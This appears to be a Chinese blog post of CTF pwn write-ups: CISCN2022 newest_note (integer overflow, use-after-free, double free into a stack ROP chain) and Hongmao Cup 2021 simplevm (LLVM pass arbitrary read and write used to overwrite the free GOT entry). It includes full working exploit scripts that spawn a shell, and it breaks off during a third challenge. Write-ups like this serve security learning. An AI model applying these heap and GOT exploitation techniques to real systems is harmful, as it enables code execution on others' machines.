    <content type="html"><![CDATA[<h2 id="0x1-CISCN2022-newest-note-【整数溢出，UAF】"><a href="#0x1-CISCN2022-newest-note-【整数溢出，UAF】" class="headerlink" title="0x1.CISCN2022 newest_note 【整数溢出，UAF】"></a>0x1.CISCN2022 newest_note 【整数溢出，UAF】</h2><p>libc是2.34，由于glibc-all-in-one拉下来的libc没有调试符号，所以看堆特别不方便，因此我们需要手动编译glibc2.34的源码，得到调试符号，然后patch。</p><p>看到程序伪代码</p><p><a href="https://imgtu.com/i/Xdvcrj"><img src="https://s1.ax1x.com/2022/06/05/Xdvcrj.png" alt="Xdvcrj.png"></a></p><p>readnum返回一个无符号整形</p><p><a href="https://imgtu.com/i/XdvXIx"><img src="https://s1.ax1x.com/2022/06/05/XdvXIx.png" alt="XdvXIx.png"></a></p><p>下面的<code>book = malloc(8 * pages);</code>，存在一个整数溢出，当pages*8超过了0x100000000时，就会向上溢出为一个很小的值。</p><p><a href="https://imgtu.com/i/Xdx6fK"><img src="https://s1.ax1x.com/2022/06/05/Xdx6fK.png" alt="Xdx6fK.png"></a></p><p>add函数中，申请的chunk固定为0x30，index由用户设置，只需要小于pages即可，将申请到的chunk存储在由index确定的内存中。</p><p><a href="https://imgtu.com/i/XdzQ1O"><img src="https://s1.ax1x.com/2022/06/05/XdzQ1O.png" alt="XdzQ1O.png"></a></p><p>dele函数存在UAF</p><p><a href="https://imgtu.com/i/XdzU4P"><img src="https://s1.ax1x.com/2022/06/05/XdzU4P.png" alt="XdzU4P.png"></a></p><p>show功能使用puts输出</p><p>漏洞利用</p><p>1.利用整数溢出漏洞，将page设置为一个较大的值，溢出之后只会申请一个小chunk</p><p>2.先dele掉一个chunk，泄露堆地址</p><p>3.计算好index，申请一个chunk，将之前被dele掉的chunk的bk指针填充为新申请来的chunk的地址，这样就能够继续free这个chunk，构成double free</p><p>4.double free申请到books，然后将其free得到unsortedbin，泄露libc地址，得到environ的地址</p><p>5.得到栈地址</p><p>6.第二次double free将chunk申请到栈上，rop拿shell</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;How many pages your notebook will be? :&#x27;</span>)</span><br><span class="line">size=<span class="number">0x20000000</span>+<span class="number">0xa0</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xab</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">heap_addr=(heap_base&gt;&gt;<span class="number">12</span>)^(heap_base+<span class="number">0x2a0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(heap_addr))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,p64(heap_base+<span class="number">0x7b0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebcc0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">env=libc_base+libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000028802</span></span><br><span class="line">log.success(<span class="string">&#x27;system_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;binsh_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;env =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(env)))</span><br><span class="line">add(<span class="number">0</span>,p64(env))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">stack_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x138</span></span><br><span class="line">log.success(<span class="string">&#x27;stack_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_addr)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x19</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">addr=(heap_base&gt;&gt;<span class="number">12</span>)^(stack_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,p64(addr))</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">quit()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x2-红帽杯2021-simplevm-【llvm-pwn，任意地址读写】"><a href="#0x2-红帽杯2021-simplevm-【llvm-pwn，任意地址读写】" class="headerlink" title="0x2.红帽杯2021 simplevm 【llvm pwn，任意地址读写】"></a>0x2.红帽杯2021 simplevm 【llvm pwn，任意地址读写】</h2><p>llvm pass的pwn题，llvm pass是个啥我就不多解释了，毕竟很多佬们都说过了，这里就记录一下调试等我在做题中遇到的问题</p><p>直接用IDA打开题目给的VMPass.so文件，然后在虚表中找到<strong>runOnFunction</strong>函数，这个函数位于虚表的最后一个，分析它就行了。</p><p><a href="https://imgtu.com/i/XB8c3q"><img src="https://s1.ax1x.com/2022/06/07/XB8c3q.png" alt="XB8c3q.png"></a></p><p>首先会获取函数名，检查是否为<code>o0o0o0o0</code>，如果是的话就进入<code>sub_7F43E642CAC0</code>这个函数</p><p><a href="https://imgtu.com/i/XBGYa4"><img src="https://s1.ax1x.com/2022/06/07/XBGYa4.png" alt="XBGYa4.png"></a></p><p>遍历IR中的每个BasicBlock，调用<code>sub_7F43E642CB80</code>进行处理</p><p><a href="https://imgtu.com/i/XBYrUe"><img src="https://s1.ax1x.com/2022/06/07/XBYrUe.png" alt="XBYrUe.png"></a></p><p>对每条<code>Instruction</code>进行处理，如果这条<code>Instruction</code>是函数调用，则获取函数名，然后根据不同的函数名进行不同的操作</p><p><a href="https://imgtu.com/i/XBYIUg"><img src="https://s1.ax1x.com/2022/06/07/XBYIUg.png" alt="XBYIUg.png"></a></p><p>比如这条匹配到函数名为pop，会获取这个函数的第一个参数值，如果为1，就将栈顶的值赋给register1，为2就将栈顶的值赋给register2.</p><p>一共有pop，push，store，load，add，min这6个操作，漏洞出现在store和load操作中，如下</p><p><a href="https://imgtu.com/i/XBNy6I"><img src="https://s1.ax1x.com/2022/06/07/XBNy6I.png" alt="XBNy6I.png"></a></p><p>store操作将一个寄存器的值赋给另一个寄存器的值指向的内存，没有对寄存器的值做限制，所以存在任意地址写。</p><p><a href="https://imgtu.com/i/XBN20f"><img src="https://s1.ax1x.com/2022/06/07/XBN20f.png" alt="XBN20f.png"></a></p><p>load操作和store操作是反过来的，同样没有对寄存器的值做限制，可以认为是一个任意地址读。</p><p>在llvmpass pwn中，我们要pwn的不是这个VMPass.so，而是opt这个程序，opt会加载VMPass.so这个动态链接库。</p><p>我们首先检查一下<code>opt-8</code>这个程序的保护</p><p><a href="https://imgtu.com/i/XBNo1s"><img src="https://s1.ax1x.com/2022/06/07/XBNo1s.png" alt="XBNo1s.png"></a></p><p>只开启了NX，这种情况我们可以修改某个函数的got表，将其改为onegadget或者system函数，然后触发即可。</p><p>那么选择哪个函数的got表进行修改？</p><p>在函数的最后，调用了free函数</p><p><a href="https://imgtu.com/i/XBUm3d"><img src="https://s1.ax1x.com/2022/06/07/XBUm3d.png" alt="XBUm3d.png"></a></p><p>我们可以将free的got表修改为onegadget，在退出这个函数的时候就会触发onegadget</p><p>整体利用思路为：先将free的got表地址利用add功能存入到reg1中，然后利用load功能将free的地址存入reg2，然后计算出onegadget的地址和free地址的偏移，利用add功能在reg2中构造出onegadget的地址，最后利用store功能将onegadget存入free的got表中。</p><p>如何调试？我们先写出一个大致的exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将其生成.ll文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S exp.c -o exp.ll</span><br></pre></td></tr></table></figure><p>要运行exp的话，使用如下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt-8 -load ./VMPass.so -VMPass ./exp.ll</span><br></pre></td></tr></table></figure><p>我们想要使用gdb调试exp的话，步骤如下：</p><p><a href="https://imgtu.com/i/XBavl9"><img src="https://s1.ax1x.com/2022/06/07/XBavl9.png" alt="XBavl9.png"></a></p><p>此时gdb断在了opt-8的main函数，我们使用vmmap命令查看此时的内存分布</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x777000 r-xp   377000 0      /home/lock/CTF/llvmpwn/simpleVM/opt-8</span><br><span class="line">          0x777000           0x77e000 r--p     7000 376000 /home/lock/CTF/llvmpwn/simpleVM/opt-8</span><br><span class="line">          0x77e000           0x782000 rw-p     4000 37d000 /home/lock/CTF/llvmpwn/simpleVM/opt-8</span><br><span class="line">          0x782000           0x7f3000 rw-p    71000 0      [heap]</span><br><span class="line">    0x7ffff25a5000     0x7ffff25ca000 r-xp    25000 0      /lib/x86_64-linux-gnu/libtinfo.so.5.9</span><br><span class="line">    0x7ffff25ca000     0x7ffff27ca000 ---p   200000 25000  /lib/x86_64-linux-gnu/libtinfo.so.5.9</span><br><span class="line">    0x7ffff27ca000     0x7ffff27ce000 r--p     4000 25000  /lib/x86_64-linux-gnu/libtinfo.so.5.9</span><br><span class="line">    0x7ffff27ce000     0x7ffff27cf000 rw-p     1000 29000  /lib/x86_64-linux-gnu/libtinfo.so.5.9</span><br><span class="line">    0x7ffff27cf000     0x7ffff27d2000 r-xp     3000 0      /lib/x86_64-linux-gnu/libdl-2.27.so</span><br><span class="line">    0x7ffff27d2000     0x7ffff29d1000 ---p   1ff000 3000   /lib/x86_64-linux-gnu/libdl-2.27.so</span><br><span class="line">    0x7ffff29d1000     0x7ffff29d2000 r--p     1000 2000   /lib/x86_64-linux-gnu/libdl-2.27.so</span><br><span class="line">    0x7ffff29d2000     0x7ffff29d3000 rw-p     1000 3000   /lib/x86_64-linux-gnu/libdl-2.27.so</span><br><span class="line">    0x7ffff29d3000     0x7ffff29da000 r-xp     7000 0      /lib/x86_64-linux-gnu/librt-2.27.so</span><br><span class="line">    0x7ffff29da000     0x7ffff2bd9000 ---p   1ff000 7000   /lib/x86_64-linux-gnu/librt-2.27.so</span><br><span class="line">    0x7ffff2bd9000     0x7ffff2bda000 r--p     1000 6000   /lib/x86_64-linux-gnu/librt-2.27.so</span><br><span class="line">    0x7ffff2bda000     0x7ffff2bdb000 rw-p     1000 7000   /lib/x86_64-linux-gnu/librt-2.27.so</span><br><span class="line">    0x7ffff2bdb000     0x7ffff2bf7000 r-xp    1c000 0      /lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">    0x7ffff2bf7000     0x7ffff2df6000 ---p   1ff000 1c000  /lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">    0x7ffff2df6000     0x7ffff2df7000 r--p     1000 1b000  /lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">    0x7ffff2df7000     0x7ffff2df8000 rw-p     1000 1c000  /lib/x86_64-linux-gnu/libz.so.1.2.11</span><br><span class="line">    0x7ffff2df8000     0x7ffff2e29000 r-xp    31000 0      /usr/lib/x86_64-linux-gnu/libedit.so.2.0.56</span><br><span class="line">    0x7ffff2e29000     0x7ffff3028000 ---p   1ff000 31000  /usr/lib/x86_64-linux-gnu/libedit.so.2.0.56</span><br><span class="line">    0x7ffff3028000     0x7ffff302a000 r--p     2000 30000  /usr/lib/x86_64-linux-gnu/libedit.so.2.0.56</span><br><span class="line">    0x7ffff302a000     0x7ffff302b000 rw-p     1000 32000  /usr/lib/x86_64-linux-gnu/libedit.so.2.0.56</span><br><span class="line">    0x7ffff302b000     0x7ffff302f000 rw-p     4000 0      [anon_7ffff302b]</span><br><span class="line">    0x7ffff302f000     0x7ffff3036000 r-xp     7000 0      /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4</span><br><span class="line">    0x7ffff3036000     0x7ffff3235000 ---p   1ff000 7000   /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4</span><br><span class="line">    0x7ffff3235000     0x7ffff3236000 r--p     1000 6000   /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4</span><br><span class="line">    0x7ffff3236000     0x7ffff3237000 rw-p     1000 7000   /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4</span><br><span class="line">    0x7ffff3237000     0x7ffff341e000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff341e000     0x7ffff361e000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff361e000     0x7ffff3622000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff3622000     0x7ffff3624000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7ffff3624000     0x7ffff3628000 rw-p     4000 0      [anon_7ffff3624]</span><br><span class="line">    0x7ffff3628000     0x7ffff363f000 r-xp    17000 0      /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff363f000     0x7ffff383e000 ---p   1ff000 17000  /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff383e000     0x7ffff383f000 r--p     1000 16000  /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff383f000     0x7ffff3840000 rw-p     1000 17000  /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff3840000     0x7ffff39dd000 r-xp   19d000 0      /lib/x86_64-linux-gnu/libm-2.27.so</span><br><span class="line">    0x7ffff39dd000     0x7ffff3bdc000 ---p   1ff000 19d000 /lib/x86_64-linux-gnu/libm-2.27.so</span><br><span class="line">    0x7ffff3bdc000     0x7ffff3bdd000 r--p     1000 19c000 /lib/x86_64-linux-gnu/libm-2.27.so</span><br><span class="line">    0x7ffff3bdd000     0x7ffff3bde000 rw-p     1000 19d000 /lib/x86_64-linux-gnu/libm-2.27.so</span><br><span class="line">    0x7ffff3bde000     0x7ffff3d57000 r-xp   179000 0      /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">    0x7ffff3d57000     0x7ffff3f57000 ---p   200000 179000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">    0x7ffff3f57000     0x7ffff3f61000 r--p     a000 179000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">    0x7ffff3f61000     0x7ffff3f63000 rw-p     2000 183000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25</span><br><span class="line">    0x7ffff3f63000     0x7ffff3f67000 rw-p     4000 0      [anon_7ffff3f63]</span><br><span class="line">    0x7ffff3f67000     0x7ffff7735000 r-xp  37ce000 0      /usr/lib/x86_64-linux-gnu/libLLVM-8.so.1</span><br><span class="line">    0x7ffff7735000     0x7ffff7736000 ---p     1000 37ce000 /usr/lib/x86_64-linux-gnu/libLLVM-8.so.1</span><br><span class="line">    0x7ffff7736000     0x7ffff7b48000 r--p   412000 37ce000 /usr/lib/x86_64-linux-gnu/libLLVM-8.so.1</span><br><span class="line">    0x7ffff7b48000     0x7ffff7b4b000 rw-p     3000 3be0000 /usr/lib/x86_64-linux-gnu/libLLVM-8.so.1</span><br><span class="line">    0x7ffff7b4b000     0x7ffff7bb4000 rw-p    69000 0      [anon_7ffff7b4b]</span><br><span class="line">    0x7ffff7bb4000     0x7ffff7bce000 r-xp    1a000 0      /lib/x86_64-linux-gnu/libpthread-2.27.so</span><br><span class="line">    0x7ffff7bce000     0x7ffff7dcd000 ---p   1ff000 1a000  /lib/x86_64-linux-gnu/libpthread-2.27.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dce000 r--p     1000 19000  /lib/x86_64-linux-gnu/libpthread-2.27.so</span><br><span class="line">    0x7ffff7dce000     0x7ffff7dcf000 rw-p     1000 1a000  /lib/x86_64-linux-gnu/libpthread-2.27.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      [anon_7ffff7dcf]</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7fcd000     0x7ffff7fd7000 rw-p     a000 0      [anon_7ffff7fcd]</span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffb000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffc000 r-xp     1000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><p>由于VMPass.so是动态加载的，此时程序还没有使用VMPass.so中的函数，因此在vmmap中看不到VMPass.so，我们将断点下在getName函数上</p><p><a href="https://imgtu.com/i/XBdnmt"><img src="https://s1.ax1x.com/2022/06/07/XBdnmt.png" alt="XBdnmt.png"></a></p><p><a href="https://imgtu.com/i/XBdKTf"><img src="https://s1.ax1x.com/2022/06/07/XBdKTf.png" alt="XBdKTf.png"></a></p><p><a href="https://imgtu.com/i/XBdQk8"><img src="https://s1.ax1x.com/2022/06/07/XBdQk8.png" alt="XBdQk8.png"></a></p><p>然后运行，程序就会断在getName函数，再看此时的vmmap</p><p><a href="https://imgtu.com/i/XBdXAf"><img src="https://s1.ax1x.com/2022/06/07/XBdXAf.png" alt="XBdXAf.png"></a></p><p>VMPass.so已经被加载了进来，后续想要打其他断点就很方便了。</p><p>由于这个题目的exp很简单，用不到大量调试，我们在pwntools中加载opt-8，查看其中free函数的got表，为<code>0x77e100</code></p><p>然后我们在gdb中查看这个地址中的内容就能得到free函数的真正加载地址</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/g 0x77e100</span><br><span class="line">0x77e100:0x00007ffff32ce910</span><br></pre></td></tr></table></figure><p><code>0x00007ffff32ce910</code>就是free的真正加载地址，然后我们计算出这个地址和onegadget的偏移量</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; libc</span><br><span class="line">libc : 0x7ffff3237000</span><br><span class="line">pwndbg&gt; p/x 0x10a2fc+0x7ffff3237000</span><br><span class="line"><span class="variable">$4</span> = 0x7ffff33412fc</span><br><span class="line">pwndbg&gt; p/x 0x7ffff33412fc-0x00007ffff32ce910</span><br><span class="line"><span class="variable">$5</span> = 0x729ec</span><br></pre></td></tr></table></figure><p>exp.c如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);</span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x3-CISCN2021-Satool-【逆向】"><a href="#0x3-CISCN2021-Satool-【逆向】" class="headerlink" title="0x3.CISCN2021 Satool 【逆向】"></a>0x3.CISCN2021 Satool 【逆向】</h2><p>为啥不拿CISCN2022的satool来复现呢？因为太难了，看了大佬的wp，程序没看明白，洞也没看懂更别说exp了，还是搞搞以前的简单点的来复现</p><p>还是直接找到<strong>runOnFunction</strong>这个虚函数，分析它就完事了</p><p><a href="https://imgtu.com/i/XrcrgP"><img src="https://s1.ax1x.com/2022/06/08/XrcrgP.png" alt="XrcrgP.png"></a></p><p>这个函数很长，开头先获取函数名，然后比较函数名是否为‘<code>r0oDkc4B</code>’，这里需要注意，这里比较的并不是字符串，而是16进制数，在汇编里看</p><p><a href="https://imgtu.com/i/XrWRs0"><img 